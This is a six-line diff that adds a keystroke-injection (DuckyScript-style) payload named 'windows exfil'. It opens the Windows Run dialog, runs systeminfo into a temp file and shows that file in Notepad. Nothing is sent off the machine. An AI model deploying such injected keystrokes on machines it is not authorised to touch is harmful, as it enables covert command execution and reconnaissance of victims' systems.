@@ -1,0 +1,6 @@
+META windows exfil
+DELAY 1000
+GUI r
+DELAY 700
+STRING cmd /k systeminfo > "%TEMP%\info.txt" && start notepad "%TEMP%\info.txt"
+ENTER
